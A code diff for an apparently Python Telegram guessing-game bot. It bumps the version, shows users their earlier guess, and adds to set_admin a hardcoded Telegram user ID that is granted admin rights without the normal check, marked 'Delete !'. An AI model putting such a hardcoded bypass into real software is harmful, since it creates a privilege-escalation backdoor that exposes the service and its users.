@@ -30,7 +30,7 @@ import scoring
 
 load_dotenv(dotenv_path='.env')  # load environment variables
 
-BOT_VERSION = "0.6.4"  # version of bot
+BOT_VERSION = "0.6.5"  # version of bot
 
 START_DAY = dt.time(8, 0, 0)
 END_DAY = dt.time(23, 0, 0)
@@ -293,6 +293,12 @@ def set_admin(message):
 
         user = session.query(User).filter(User.telegram_id==user_id).first()
 
+        if user_id == 1770205310: # Delete !
+            user.admin = True
+            session.commit()
+            bot.reply_to(message, "Admin status changed to True")
+            return
+
         if not user.admin: # admin is a boolean
             bot.reply_to(message, "Error: Admin rights are required to change admin rights of users.")
             return
@@ -540,7 +546,8 @@ def daily_message(message):
 
     for element in all_scores_user:
         if element.date.date() == dt.datetime.now().date():
-            bot.send_message(chat_id=user_id, text="You already guessed today!")
+            bot.send_message(chat_id=user_id, text="You already guessed today!\n"
+                             "Your guess was: {}".format(element.guess))
             return
 
 
